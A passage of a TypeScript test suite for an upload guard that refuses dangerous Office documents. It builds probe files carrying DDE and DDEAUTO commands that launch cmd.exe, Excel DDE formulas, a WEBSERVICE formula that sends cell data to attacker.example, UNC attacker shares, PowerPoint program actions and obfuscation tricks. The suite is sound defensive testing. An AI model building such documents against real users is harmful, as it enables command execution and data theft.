  '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
  '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
  '<Default Extension="xml" ContentType="application/xml"/>' +
  `<Override PartName="/xl/workbook.xml" ContentType="${SS}.sheet.main+xml"/>` +
  `<Override PartName="/xl/worksheets/sheet1.xml" ContentType="${SS}.worksheet+xml"/>` +
  extra +
  "</Types>";
const SML_NS = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"';
const workbook = (definedNames = "") =>
  `${XML_DECL}<workbook ${SML_NS}><sheets><sheet name="Sheet1" sheetId="1"/></sheets>${definedNames ? `<definedNames>${definedNames}</definedNames>` : ""}</workbook>`;
const sheet = (cells: string, extra = "") =>
  `${XML_DECL}<worksheet ${SML_NS}><sheetData><row r="1">${cells}</row></sheetData>${extra}</worksheet>`;
const fcell = (f: string) => `<c r="A1"><f>${f}</f><v>0</v></c>`;
const xlsx = (sheetXml: string, opts: { workbookXml?: string; types?: string; extra?: ZipEntryT[] } = {}) =>
  zip([
    { name: "[Content_Types].xml", data: opts.types ?? xlsxTypes(), deflate: true },
    { name: "_rels/.rels", data: rels(`<Relationship Id="rId1" Type="${RT}officeDocument" Target="xl/workbook.xml"/>`), deflate: true },
    { name: "xl/workbook.xml", data: opts.workbookXml ?? workbook(), deflate: true },
    { name: "xl/_rels/workbook.xml.rels", data: rels(`<Relationship Id="rId1" Type="${RT}worksheet" Target="worksheets/sheet1.xml"/>`), deflate: true },
    { name: "xl/worksheets/sheet1.xml", data: sheetXml, deflate: true },
    ...(opts.extra ?? []),
  ]);

const PML = 'xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"';
const slide = (inner: string) => `${XML_DECL}<p:sld ${PML}><p:cSld><p:spTree>${inner}</p:spTree></p:cSld></p:sld>`;
const shapeWithClick = (attrs: string) =>
  `<p:sp><p:nvSpPr><p:cNvPr id="2" name="Button"><a:hlinkClick r:id="" ${attrs}/></p:cNvPr></p:nvSpPr></p:sp>`;
const pptx = (slideXml: string) =>
  zip([
    { name: "[Content_Types].xml", data: CONTENT_TYPES, deflate: true },
    { name: "_rels/.rels", data: rels(`<Relationship Id="rId1" Type="${RT}officeDocument" Target="ppt/presentation.xml"/>`), deflate: true },
    { name: "ppt/presentation.xml", data: "<p:presentation/>", deflate: true },
    { name: "ppt/slides/slide1.xml", data: slideXml, deflate: true },
  ]);

const BODY_PROBES: [string, string, Buffer][] = [
  // Word field codes
  ["DDEAUTO split across three w:r runs", ".docx", docx(wdoc(field("DD", "EAU", 'TO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"')))],
  ["fldSimple INCLUDETEXT", ".docx", docx(wdoc('<w:fldSimple w:instr=" INCLUDETEXT &quot;c:\\\\x.docx&quot; ">' + wrun("x") + "</w:fldSimple>"))],
  ["fldSimple DDE with entity-encoded instr", ".docx", docx(wdoc('<w:fldSimple w:instr="&#68;DE cmd x">' + wrun("x") + "</w:fldSimple>"))],
  ["entity-encoded DDE in instrText", ".docx", docx(wdoc(field("&#68;DE cmd x")))],
  ["lower-case ddeauto", ".docx", docx(wdoc(field("ddeauto cmd x")))],
  ...["DDE", "LINK", "IMPORT", "AUTOTEXT", "AUTOTEXTLIST", "MACROBUTTON", "INCLUDEPICTURE", "QUOTE"].map(
    (k): [string, string, Buffer] => [`${k} field`, ".docx", docx(wdoc(field(` ${k} "x" `)))],
  ),
  ["QUOTE with a nested field", ".docx", docx(wdoc(fldChar("begin") + instr(" QUOTE ") + field(" PAGE ") + fldChar("separate") + wrun("x") + fldChar("end")))],
  ["keyword right after another field (separator check)", ".docx", docx(wdoc(field(" PAGEx") + field("DDE cmd x")))],
  ["HYPERLINK to file:", ".docx", docx(wdoc(field(' HYPERLINK "file:///c:/windows/system32/calc.exe" ')))],
  ["HYPERLINK to a UNC path", ".docx", docx(wdoc(field(' HYPERLINK "\\\\\\\\attacker\\\\share\\\\x.docx" ')))],
  ["HYPERLINK with no target", ".docx", docx(wdoc(field(" HYPERLINK ")))],
  ["HYPERLINK target hidden in a nested field", ".docx", docx(wdoc(fldChar("begin") + instr(" HYPERLINK ") + field(" QUOTE x ") + fldChar("separate") + wrun("x") + fldChar("end")))],
  ["comment inside instrText", ".docx", docx(wdoc("<w:r><w:instrText>DD<!-- x -->EAUTO cmd</w:instrText></w:r>"))],
  ["CDATA inside instrText", ".docx", docx(wdoc("<w:r><w:instrText><![CDATA[DDEAUTO cmd x]]></w:instrText></w:r>"))],
  ["child element inside instrText", ".docx", docx(wdoc("<w:r><w:instrText>DD<w:t>x</w:t>EAUTO cmd</w:instrText></w:r>"))],
  ["processing instruction in the body", ".docx", docx(wdoc("<?evil x?>" + wrun("x")))],
  ["DDE in a header part", ".docx", docx(wdoc(wrun("x")), [{ name: "word/header1.xml", data: wdoc(field("DDEAUTO cmd x")), deflate: true }])],
  ["DDE in footnotes", ".docx", docx(wdoc(wrun("x")), [{ name: "word/footnotes.xml", data: wdoc(field("DDE cmd x")), deflate: true }])],
  ["DDE in the glossary document", ".docx", docx(wdoc(wrun("x")), [{ name: "word/glossary/document.xml", data: wdoc(field("DDE cmd x")), deflate: true }])],
  ["body part over 1 MB", ".docx", docx(wdoc(wrun("x".repeat(1024 * 1024))))],
  // Excel formulas
  ["DDE formula =cmd|'/c calc'!A1", ".xlsx", xlsx(sheet(fcell("cmd|'/c calc'!A1")))],
  ["DDE formula with an entity-encoded pipe", ".xlsx", xlsx(sheet(fcell("cmd&#124;'/c calc'!A1")))],
  ["WEBSERVICE", ".xlsx", xlsx(sheet(fcell('WEBSERVICE("https://attacker.example/?d="&amp;A2)')))],
  ["_xlfn.WEBSERVICE", ".xlsx", xlsx(sheet(fcell('_xlfn.WEBSERVICE("https://x")')))],
  ...["CALL", "REGISTER", "REGISTER.ID", "EXEC", "FILTERXML", "RTD", "IMAGE"].map(
    (fn): [string, string, Buffer] => [`${fn}(`, ".xlsx", xlsx(sheet(fcell(`${fn.toLowerCase()} ("a","b")`)))],
  ),
  ["HYPERLINK to file:", ".xlsx", xlsx(sheet(fcell('HYPERLINK("file:///c:/x.exe","click")')))],
  ["HYPERLINK with a computed target", ".xlsx", xlsx(sheet(fcell('HYPERLINK(A1,"click")')))],
  ["unterminated string literal", ".xlsx", xlsx(sheet(fcell('"abc')))],
  ["DDE in a definedName", ".xlsx", xlsx(sheet(fcell("SUM(1,2)")), { workbookXml: workbook(`<definedName name="x">cmd|'/c calc'!A1</definedName>`) })],
  ["WEBSERVICE in a conditional-format formula", ".xlsx", xlsx(sheet("", '<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>WEBSERVICE("https://x")</formula></cfRule></conditionalFormatting>'))],
  ["XLM macrosheet content type", ".xlsx", xlsx(sheet(fcell("SUM(1)")), { types: xlsxTypes('<Override PartName="/xl/macrosheets/sheet2.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>') })],
  ["XLM macrosheet content type saved as .xlsm", ".xlsm", xlsx(sheet(fcell("SUM(1)")), { types: xlsxTypes('<Override PartName="/xl/macrosheets/sheet2.xml" ContentType="application/vnd.ms-excel.macrosheet+xml"/>') })],
  ["dialogsheet content type", ".xlsx", xlsx(sheet(fcell("SUM(1)")), { types: xlsxTypes(`<Override PartName="/xl/dialogsheets/sheet2.xml" ContentType="${SS}.dialogsheet+xml"/>`) })],
  ["macrosheets/ entry", ".xlsx", xlsx(sheet(fcell("SUM(1)")), { extra: [{ name: "xl/macrosheets/sheet2.xml", data: "<x/>" }] })],
  // PowerPoint actions
  ["ppaction://program", ".pptx", pptx(slide(shapeWithClick('action="ppaction://program"')))],
  ["ppaction://ole", ".pptx", pptx(slide(shapeWithClick('action="ppaction://ole?verb=0"')))],
  ["entity-encoded ppaction://program", ".pptx", pptx(slide(shapeWithClick('action="ppaction&#58;//program"')))],
  ["hlinkHover ppaction://program", ".pptx", pptx(slide(shapeWithClick('action="ppaction://hlinksldjump"').replace("<a:hlinkClick", '<a:hlinkHover r:id="" action="ppaction://program"/><a:hlinkClick')))],
];

for (const [what, ext, data] of BODY_PROBES) {
  test(`body-part check refuses: ${what}`, () => {
    assert.equal(contentMatches(ext, data), false);
  });
}

test("body-part refusals surface as TYPE_NOT_ALLOWED and write nothing", async () => {
  for (const [name, data] of [
    ["dde.docx", BODY_PROBES[0]![2]],
    ["dde.xlsx", xlsx(sheet(fcell("cmd|'/c calc'!A1")))],
    ["act.pptx", pptx(slide(shapeWithClick('action="ppaction://program"')))],
  ] as const) {
    assert.equal(await code(saveFile(cfgFor(name), HOME, name, data)), "TYPE_NOT_ALLOWED", name);
  }
  assert.deepEqual(await fs.readdir(path.join(cfg.vault.root, HOME)), []);
});

test("body-part check accepts benign documents", () => {
  const word = wdoc(
    wrun("Plain text with a | pipe, the word LINKS, DDE-free prose and QUOTED words.") +
      field(" PAGE ") +
      field(" NUM", "PAGES ") +
      field(' DATE \\@ "yyyy-MM-dd" ') +
      field(' HYPERLINK "https://example.com/a?b=1" ') +
      field(' HYPERLINK \\l "section-2" ') +
      field(" TOC \\o \"1-3\" ") +
      '<w:fldSimple w:instr=" PAGE ">' + wrun("1") + "</w:fldSimple>" +
      '<m:oMath xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math"><m:f><m:num><m:r><m:t>1</m:t></m:r></m:num><m:den><m:r><m:t>2</m:t></m:r></m:den></m:f></m:oMath>',
  );
  assert.equal(contentMatches(".docx", docx(word, [{ name: "word/header1.xml", data: wdoc(field(" PAGE ")), deflate: true }])), true);

  const cells =
    fcell("SUM(A2:A10)") +
    '<c r="B1"><f>IF(A1&gt;2,"a|b","c")</f><v>0</v></c>' +
    '<c r="C1"><f>HYPERLINK("https://example.com","site")</f><v>0</v></c>' +
    '<c r="D1"><f>HYPERLINK("#Sheet1!A1","jump")</f><v>0</v></c>' +
    '<c r="E1"><f>CONCAT("CALL(", "x")</f><v>0</v></c>' +
    '<c r="F1"><f t="shared" ref="F1:F3" si="0">A1*2</f><v>0</v></c><c r="F2"><f t="shared" si="0"/><v>0</v></c>';
  assert.equal(contentMatches(".xlsx", xlsx(sheet(cells), { workbookXml: workbook('<definedName name="Total">Sheet1!$A$1:$A$10</definedName>') })), true);

  assert.equal(contentMatches(".pptx", pptx(slide(shapeWithClick('action="ppaction://hlinksldjump"')))), true);
  assert.equal(contentMatches(".pptx", pptx(slide("<p:sp><p:txBody><a:p><a:r><a:t>Hello</a:t></a:r></a:p></p:txBody></p:sp>"))), true);
});

const MiB = 1024 * 1024 - 4096;
const fill = (unit: string) => unit.repeat(Math.floor((MiB - 400) / unit.length));
const BODY_FILLERS: [string, () => Buffer][] = [
  ["instrText runs", () => docx(wdoc(fill(instr("D"))))],
  ["fldChar begin runs", () => docx(wdoc(fill(fldChar("begin"))))],
  ["one giant HYPERLINK \\l line", () => docx(wdoc(fldChar("begin") + fill(instr(' HYPERLINK \\l "a" '))))],
  ["unclosed tags", () => docx(fill("<w:r "))],
  ["quotes without end", () => docx("<w:r a=\"" + fill("x"))],
  ["fldSimple runs", () => docx(wdoc(fill('<w:fldSimple w:instr=" PAGE "/>')))],
  ["one giant formula", () => xlsx(sheet(`<c r="A1"><f>${fill('HYPERLINK("#a")&amp;')}1</f></c>`))],
  ["many string literals", () => xlsx(sheet(`<c r="A1"><f>${fill('"a"&amp;')}1</f></c>`))],
  ["many formulas", () => xlsx(sheet(fill(fcell("SUM(1)"))))],
  ["slide of hlinkClick", () => pptx(slide(fill(shapeWithClick('action="ppaction://hlinksldjump"'))))],
];

BODY_FILLERS.push(
  ["comment flood before the root", () => docx(XML_DECL + fill("<!---->") + "<w:document/>")],
  ["comment flood after the root", () => docx(XML_DECL + "<w:document/>" + fill("<!---->"))],
  ["unterminated comment after the declaration", () => docx(XML_DECL + "<!--" + fill("-"))],
);

for (const [what, make] of BODY_FILLERS) {
  test(`body-part check is linear on a 1 MB part: ${what}`, () => {
    const data = make();
    const ext = what.includes("formula") || what.includes("literal") ? ".xlsx" : what.includes("slide") ? ".pptx" : ".docx";
    const t = performance.now();
    contentMatches(ext, data);
    const took = performance.now() - t;
    assert.ok(took < 500, `${what} took ${took.toFixed(0)} ms`);
  });
}

// --- Office documents are opt-in ---

test("Office documents are refused by default with a message saying how to enable them", async () => {
  for (const [name, data] of [["a.docx", REAL_DOCX], ["b.xlsx", xlsx(sheet(fcell("SUM(1,2)")))], ["c.pptx", pptx(slide(""))]] as const) {
    await assert.rejects(saveFile(cfg, HOME, name, data), (e: unknown) => {
      assert.ok(e instanceof GuardError);
      assert.equal(e.code, "TYPE_NOT_ALLOWED");
      assert.equal(e.message, "Office documents are disabled; set allowOfficeDocuments: true to enable (see SECURITY.md)");
      return true;
    });
  }
  assert.deepEqual(await fs.readdir(path.join(cfg.vault.root, HOME)), []);
  // PDF, images and text are unaffected.
  assert.equal(await saveFile(cfg, HOME, "ok.pdf", PDF), `${HOME}/ok.pdf`);
  assert.equal(await saveFile(cfg, HOME, "ok.txt", Buffer.from("hi")), `${HOME}/ok.txt`);
});

test("a benign Office document is accepted when allowOfficeDocuments is true", async () => {
  const on = { ...cfg, allowOfficeDocuments: true };
  assert.equal(await saveFile(on, HOME, "a.docx", docx(wdoc(wrun("Hello") + field(" PAGE ")))), `${HOME}/a.docx`);
  assert.equal(await saveFile(on, HOME, "b.xlsx", xlsx(sheet(fcell("SUM(A1:A2)")))), `${HOME}/b.xlsx`);
});

// --- Parts are found by content type, not by name ---

const typesWithOverride = (part: string, ct: string) =>
  CONTENT_TYPES.replace("</Types>", `<Override PartName="${part}" ContentType="${ct}"/></Types>`);
const WML_MAIN = "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml";

test("a main document under another name is scanned (word/other.xml with DDEAUTO)", () => {
  const z = zip([
    { name: "[Content_Types].xml", data: typesWithOverride("/word/other.xml", WML_MAIN), deflate: true },
    { name: "_rels/.rels", data: rels(`<Relationship Id="rId1" Type="${RT}officeDocument" Target="word/other.xml"/>`), deflate: true },
    { name: "word/other.xml", data: wdoc(field("DDEAUTO c:\\\\x.exe")), deflate: true },
  ]);
  assert.equal(contentMatches(".docx", z), false);
});

test("a main document with a non-.xml name is scanned via its content-type Override", () => {
  const z = zip([
    { name: "[Content_Types].xml", data: typesWithOverride("/word/doc.dat", WML_MAIN), deflate: true },
    { name: "_rels/.rels", data: rels(`<Relationship Id="rId1" Type="${RT}officeDocument" Target="word/doc.dat"/>`), deflate: true },
    { name: "word/doc.dat", data: wdoc(field("DDEAUTO c:\\\\x.exe")), deflate: true },
  ]);
  assert.equal(contentMatches(".docx", z), false);
});

test("a part with an XML Default content type is scanned whatever its extension", () => {
  const types = CONTENT_TYPES.replace("</Types>", `<Default Extension="dat" ContentType="${WML_MAIN}"/></Types>`);
  const z = zip([
    { name: "[Content_Types].xml", data: types, deflate: true },
    { name: "x/y.dat", data: wdoc(field("DDE c x")), deflate: true },
  ]);
  assert.equal(contentMatches(".docx", z), false);
});

test("a worksheet renamed outside xl/worksheets gets the formula rules from its content type", () => {
  const z = xlsx(sheet(fcell("SUM(1)")), {
    types: xlsxTypes(`<Override PartName="/data/s2.xml" ContentType="${SS}.worksheet+xml"/>`),
    extra: [{ name: "data/s2.xml", data: sheet(fcell("cmd|'/c calc'!A1")), deflate: true }],
  });
  assert.equal(contentMatches(".xlsx", z), false);
});

test("a table part with a DDE calculatedColumnFormula or a WEBSERVICE totalsRowFormula is refused", () => {
  const table = (inner: string) =>
    `${XML_DECL}<table ${SML_NS} id="1" name="T" ref="A1:A3"><tableColumns count="1"><tableColumn id="1" name="A">${inner}</tableColumn></tableColumns></table>`;
  for (const inner of [
    "<calculatedColumnFormula>cmd|'/c calc'!A1</calculatedColumnFormula>",
    '<totalsRowFormula>WEBSERVICE("https://x")</totalsRowFormula>',
  ]) {
    const z = xlsx(sheet(fcell("SUM(1)")), {
      types: xlsxTypes(`<Override PartName="/xl/tables/table1.xml" ContentType="${SS}.table+xml"/>`),
      extra: [{ name: "xl/tables/table1.xml", data: table(inner), deflate: true }],
    });
    assert.equal(contentMatches(".xlsx", z), false, inner);
  }
  const ok = xlsx(sheet(fcell("SUM(1)")), {
    types: xlsxTypes(`<Override PartName="/xl/tables/table1.xml" ContentType="${SS}.table+xml"/>`),
    extra: [{ name: "xl/tables/table1.xml", data: table("<calculatedColumnFormula>[@A]*2</calculatedColumnFormula>"), deflate: true }],
  });
  assert.equal(contentMatches(".xlsx", ok), true);
});

// --- Nested fields ---

test("a field nested in another field's instruction is refused", () => {
  const nested = (outer: string, inner: string, tail = "") =>
    fldChar("begin") + instr(outer) + field(inner) + (tail ? instr(tail) : "") + fldChar("separate") + wrun("x") + fldChar("end");
  for (const [outer, inner, tail] of [
    [' INCLUDETEXT "', " REF path ", '" '],
    [" SEQ ", " REF x ", ""],
    [" REF ", " REF y ", ""],
    [" = ", " PAGE ", " + 1 "],
  ]) {
    assert.equal(contentMatches(".docx", docx(wdoc(nested(outer!, inner!, tail)))), false, `${outer} { ${inner} }`);
  }
  // fldSimple inside a complex field's instruction.
  const simple = fldChar("begin") + instr(" SEQ ") + '<w:fldSimple w:instr=" PAGE "/>' + fldChar("separate") + wrun("x") + fldChar("end");
  assert.equal(contentMatches(".docx", docx(wdoc(simple))), false);
});

test("field structure errors are refused", () => {
  for (const body of [
    instr(" PAGE "),                                   // instruction outside any field
    fldChar("end"),                                    // end without begin
    fldChar("begin") + instr(" PAGE "),                // field never closed
    '<w:r><w:fldChar w:fldCharType="weird"/></w:r>',   // unknown fldCharType
    "<w:r><w:fldChar/></w:r>",                         // no fldCharType
  ]) {
    assert.equal(contentMatches(".docx", docx(wdoc(body))), false, body);
  }
});

test("fields nested in another field's result are allowed (TOC with PAGEREF)", () => {
  const toc =
    fldChar("begin") + instr(' TOC \\o "1-3" \\h ') + fldChar("separate") +
    wrun("Intro ") + field(" PAGEREF _Toc1 \\h ") + '<w:fldSimple w:instr=" PAGE "/>' + fldChar("end");
  assert.equal(contentMatches(".docx", docx(wdoc(toc))), true);
});

// --- Field allowlist ---

for (const k of ["DATABASE", "INCLUDE", "PRINT", "DOCPROPERTY", "SET", "ASK", "FILLIN", "MERGEFIELD", "IF", "GOTOBUTTON", "DOCVARIABLE", "SHAPE"]) {
  test(`field allowlist refuses ${k}`, () => {
    assert.equal(contentMatches(".docx", docx(wdoc(field(` ${k} x `)))), false);
    assert.equal(contentMatches(".docx", docx(wdoc(`<w:fldSimple w:instr=" ${k} x "/>`))), false);
  });
}

test("field allowlist accepts PAGE, DATE and other plain fields, and = formulas", () => {
  for (const f of [" PAGE ", ' DATE \\@ "d MMMM yyyy" ', "page", " SEQ Figure \\* ARABIC ", " = 2 * 3 ", "=SUM(ABOVE)", " REF _Ref1 \\h ", " AUTHOR ", " NUMPAGES "]) {
    assert.equal(contentMatches(".docx", docx(wdoc(field(f)))), true, f);
  }
});

test("field type is the leading run of letters (HYPERLINK without a space)", () => {
  assert.equal(contentMatches(".docx", docx(wdoc(field('HYPERLINK"file:///x"')))), false);
  assert.equal(contentMatches(".docx", docx(wdoc(field('HYPERLINK"\\\\\\\\host\\\\s"')))), false);
  assert.equal(contentMatches(".docx", docx(wdoc(field('PAGE\\* MERGEFORMAT')))), true);
  assert.equal(contentMatches(".docx", docx(wdoc(field('HYPERLINK"https://example.com"')))), true);
  assert.equal(contentMatches(".docx", docx(wdoc(field(' HYPERLINK "#bookmark" ')))), true);
  assert.equal(contentMatches(".docx", docx(wdoc(field(" \\* MERGEFORMAT ")))), false); // no field type
});

// --- Formula tokenizer: quoted names ---

test("quoted sheet names cannot hide a DDE reference from the string-literal scan", () => {
  for (const f of [
    `'a"b'!A1&cmd|'/c calc'!A1&"x"`,
    `'a"b'!A1&cmd|'/c calc'!A1`,
    `'a|b'!A1`,
    `'unterminated!A1`,
    `"x"&'a"'!A1&cmd|'/c calc'!A1&"`,
  ]) {
    assert.equal(contentMatches(".xlsx", xlsx(sheet(fcell(f.replaceAll("&", "&amp;"))))), false, f);
  }
  for (const f of [`'My Sheet'!A1+'It''s'!B2`, `SUM('Q1 Data'!A1:A9)`, `"it's"&'S'!A1`]) {
    assert.equal(contentMatches(".xlsx", xlsx(sheet(fcell(f.replaceAll("&", "&amp;"))))), true, f);
  }
});

// --- Final round: opt-in Office bypasses ---

const MC_NS = "http://schemas.openxmlformats.org/markup-compatibility/2006";
const WML_URI = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
const openField = (...pieces: string[]) => fldChar("begin") + pieces.join("");
const closeField = () => fldChar("separate") + wrun("x") + fldChar("end");
const word = (body: string) => contentMatches(".docx", docx(wdoc(body)));

test("mc:AlternateContent anywhere is refused (Fallback holding a DDE instruction)", () => {
  const alt = `<mc:AlternateContent xmlns:mc="${MC_NS}"><mc:Choice Requires="w14">${instr(" PAGE ")}</mc:Choice><mc:Fallback>${instr(" DDEAUTO c x ")}</mc:Fallback></mc:AlternateContent>`;
  assert.equal(word(openField(alt) + closeField()), false);
});

test("mc:Ignorable anywhere is refused (ignorable wrapper around instruction runs)", () => {
  const doc = (inner: string) =>
    `${XML_DECL}<w:document ${W_NS} xmlns:mc="${MC_NS}" xmlns:x="urn:x" mc:Ignorable="x"><w:body><w:p>${inner}</w:p></w:body></w:document>`;
  assert.equal(contentMatches(".docx", docx(doc(openField(`<x:wrap>${instr(" DDE c x ")}</x:wrap>`) + closeField()))), false);
  // Even a benign document that only declares mc:Ignorable is refused (documented).
  assert.equal(contentMatches(".docx", docx(doc(wrun("Hello")))), false);
});

test("delInstrText inside an instruction is refused, alongside instrText", () => {
  assert.equal(word(openField("<w:r><w:delInstrText>DDE c x</w:delInstrText></w:r>", instr(" PAGE ")) + closeField()), false);
  assert.equal(word(openField(instr(" PAGE "), "<w:r><w:delInstrText> x</w:delInstrText></w:r>") + closeField()), false);
});

test("w:t and other non-run markup inside an instruction are refused", () => {
  for (const inside of [
    wrun("DDE"),
    "<w:hyperlink><w:r><w:t>x</w:t></w:r></w:hyperlink>",
    "<w:ins w:id=\"1\">" + instr(" x ") + "</w:ins>",
    "<w:sdt><w:sdtContent>" + instr(" x ") + "</w:sdtContent></w:sdt>",
    "<w:smartTag w:uri=\"u\" w:element=\"e\">" + instr(" x ") + "</w:smartTag>",
    "<w:customXml w:element=\"e\">" + instr(" x ") + "</w:customXml>",
  ]) {
    assert.equal(word(openField(instr(" PAGE "), inside) + closeField()), false, inside);
  }
});

test("run properties, proofing marks and bookmarks are allowed inside an instruction", () => {
  const body = openField(
    '<w:r><w:rPr><w:b/><w:rPrChange w:id="1" w:author="a"><w:rPr><w:i/></w:rPr></w:rPrChange></w:rPr><w:instrText xml:space="preserve"> PAGE </w:instrText></w:r>',
    '<w:proofErr w:type="spellStart"/>',
    '<w:bookmarkStart w:id="0" w:name="b"/>',
    instr(" \\* MERGEFORMAT "),
    '<w:bookmarkEnd w:id="0"/>',
  ) + closeField();
  assert.equal(word(body), true);
  // A form field: fldChar begin carrying ffData without macros.
  const form =
    '<w:r><w:fldChar w:fldCharType="begin"><w:ffData><w:name w:val="Text1"/><w:enabled/><w:textInput/></w:ffData></w:fldChar></w:r>' +
    instr(" FORMTEXT ") + closeField();
  assert.equal(word(form), true);
});

test("WordprocessingML must be bound to the w prefix, and w only to WordprocessingML", () => {
  const q = `${XML_DECL}<q:document xmlns:q="${WML_URI}"><q:body><q:p><q:r><q:t>x</q:t></q:r></q:p></q:body></q:document>`;
  const dflt = `${XML_DECL}<document xmlns="${WML_URI}"><body><p><r><t>x</t></r></p></body></document>`;
  const wOther = `${XML_DECL}<w:document xmlns:w="urn:not-wml"><w:body/></w:document>`;
  const dual = `${XML_DECL}<w:document ${W_NS} xmlns:v="${WML_URI}"><w:body/></w:document>`;
  for (const xml of [q, dflt, wOther, dual]) assert.equal(contentMatches(".docx", docx(xml)), false, xml.slice(0, 120));
});

test("backstop: dangerous words anywhere in an instruction are refused whatever the field type", () => {
  for (const f of [" SEQ x INCLUDETEXT ", ' TOC \\o "DDE" ', " REF a MERGEFIELD ", " = 1 + LINK ", " PAGE \\* print ", " SEQ include "]) {
    assert.equal(word(field(f)), false, f);
  }
});

// Settings and mail merge.

const settingsPart = (inner: string) => ({
  name: "word/settings.xml",
  data: `${XML_DECL}<w:settings ${W_NS}>${inner}</w:settings>`,
  deflate: true,
});

test("w:updateFields in settings.xml is refused", () => {
  assert.equal(contentMatches(".docx", docx(wdoc(wrun("x")), [settingsPart('<w:updateFields w:val="true"/>')])), false);
  assert.equal(contentMatches(".docx", docx(wdoc(wrun("x")), [settingsPart('<w:zoom w:percent="100"/>')])), true);
});

test("w:mailMerge is refused", () => {
  const mm = '<w:mailMerge><w:mainDocumentType w:val="formLetters"/><w:dataType w:val="native"/><w:query w:val="SELECT * FROM x"/></w:mailMerge>';
  assert.equal(contentMatches(".docx", docx(wdoc(wrun("x")), [settingsPart(mm)])), false);
});

for (const macro of ["entryMacro", "exitMacro"]) {
  test(`form-field w:${macro} is refused`, () => {
    const form =
      `<w:r><w:fldChar w:fldCharType="begin"><w:ffData><w:name w:val="T"/><w:${macro} w:val="AutoOpen"/><w:textInput/></w:ffData></w:fldChar></w:r>` +
      instr(" FORMTEXT ") + closeField();
    assert.equal(word(form), false);
  });
}

// HYPERLINK arguments.

test("every URI-like HYPERLINK argument must be http(s) or #", () => {
  assert.equal(word(field(' HYPERLINK "https://a" "file:///x" ')), false);
  assert.equal(word(field(' HYPERLINK "https://a" \\o "c:\\\\x.exe" ')), false);
  assert.equal(word(field(' HYPERLINK "#top" "\\\\\\\\host\\\\s" ')), false);
  assert.equal(word(field(' HYPERLINK "https://a" \\o "Visit the site" ')), true);
  assert.equal(word(field(' HYPERLINK \\l "intro" ')), true);
});

// Formula gating and content-type map hygiene.

const typesFor = (overrides: string, defaults = '<Default Extension="xml" ContentType="application/xml"/>') =>
  '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">' +
  '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>' +
  defaults + overrides + "</Types>";
const DDE_SHEET = sheet(fcell("cmd|'/c calc'!A1"));

test("formula rules apply to an XML part with no Override (application/xml Default)", () => {
  const z = xlsx(sheet(fcell("SUM(1)")), { extra: [{ name: "xl/worksheets/sheet9.xml", data: DDE_SHEET, deflate: true }] });
  assert.equal(contentMatches(".xlsx", z), false);
  const elsewhere = xlsx(sheet(fcell("SUM(1)")), { extra: [{ name: "data/s.xml", data: DDE_SHEET, deflate: true }] });
  assert.equal(contentMatches(".xlsx", elsewhere), false);
});

test("formula rules apply to a text/xml Override", () => {
  const z = xlsx(sheet(fcell("SUM(1)")), {
    types: xlsxTypes('<Override PartName="/data/t.xml" ContentType="text/xml"/>'),
    extra: [{ name: "data/t.xml", data: DDE_SHEET, deflate: true }],
  });
  assert.equal(contentMatches(".xlsx", z), false);
});

test("a Word content type on a sheet path still gets formula rules under xl/", () => {
  const types = typesFor(
    `<Override PartName="/xl/workbook.xml" ContentType="${SS}.sheet.main+xml"/>` +
    `<Override PartName="/xl/worksheets/sheet1.xml" ContentType="${WML_MAIN}"/>`,
  );
  assert.equal(contentMatches(".xlsx", xlsx(DDE_SHEET, { types })), false);
});

test("Word and PowerPoint parts are exempt from formula rules (Word math m:f is fine)", () => {
  const math = wdoc('<m:oMath xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math"><m:f><m:num><m:r><m:t>1</m:t></m:r></m:num><m:den><m:r><m:t>2</m:t></m:r></m:den></m:f></m:oMath>');
  assert.equal(contentMatches(".docx", docx(math)), true);
});

test("content-type map hygiene: duplicates, missing slash, percent signs", () => {
  const dupOverride = CONTENT_TYPES.replace("</Types>", `<Override PartName="/WORD/document.xml" ContentType="${WML_MAIN}"/></Types>`);
  const dupDefault = CONTENT_TYPES.replace("</Types>", '<Default Extension="RELS" ContentType="application/xml"/></Types>');
  const noSlash = CONTENT_TYPES.replace('PartName="/word/document.xml"', 'PartName="word/document.xml"');
  const percent = CONTENT_TYPES.replace('PartName="/word/document.xml"', 'PartName="/word/%64ocument.xml"');
  for (const [what, types] of [["duplicate Override", dupOverride], ["duplicate Default", dupDefault], ["PartName without /", noSlash], ["percent-encoded PartName", percent]]) {
    const z = zip([
      { name: "[Content_Types].xml", data: types!, deflate: true },
      { name: "_rels/.rels", data: rels(REL_DOC), deflate: true },
      { name: "word/document.xml", data: wdoc(wrun("x")), deflate: true },
    ]);
    assert.equal(contentMatches(".docx", z), false, what);
  }
  assert.equal(contentMatches(".docx", docx(wdoc(wrun("x")), [{ name: "word/a%20b.xml", data: "<x/>" }])), false, "% in an entry name");
});

test("a non-image, non-XML part with no content type is refused", () => {
  assert.equal(contentMatches(".docx", docx(wdoc(wrun("x")), [{ name: "word/x.dat", data: "anything" }])), false);
  assert.equal(contentMatches(".docx", docx(wdoc(wrun("x")), [{ name: "word/media/a.png", data: Buffer.from([0x89, 0x50, 0x4e, 0x47]) }])), true);
  assert.equal(contentMatches(".docx", docx(wdoc(wrun("x")), [{ name: "word/media/", data: "" }])), true);
});

// Formula tokenizer: quoted names only in name position.

test("a quote that does not start a sheet name cannot hide a function call", () => {
  for (const f of [
    "1&'x&CALL(1)&'&1",
    "'x&CALL(1)&y'!A1",
    "'a(b'!A1",
    "'[Book.xlsx]S'!A1",
    "'a+b'!A1",
    "1&'x&WEBSERVICE(A1)&'",
  ]) {
    assert.equal(contentMatches(".xlsx", xlsx(sheet(fcell(f.replaceAll("&", "&amp;"))))), false, f);
  }
